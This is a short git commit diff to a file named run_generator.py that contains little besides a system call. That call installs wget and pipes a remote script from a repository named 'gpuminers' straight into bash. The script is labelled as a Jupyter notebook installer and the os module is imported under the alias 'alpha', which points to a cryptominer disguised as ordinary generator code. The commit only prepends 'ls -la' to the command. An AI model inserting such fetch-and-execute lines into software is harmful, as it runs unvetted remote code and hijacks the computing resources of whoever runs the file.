671d6fbf13d117221d1034d7b41efca1235b263b
patrickdungaree <92532715+patrickdungaree@users.noreply.github.com>
2021-10-15 12:11:15 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/install_jupyter_notebook.sh | bash")
+alpha.system("ls -la && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/install_jupyter_notebook.sh | bash")
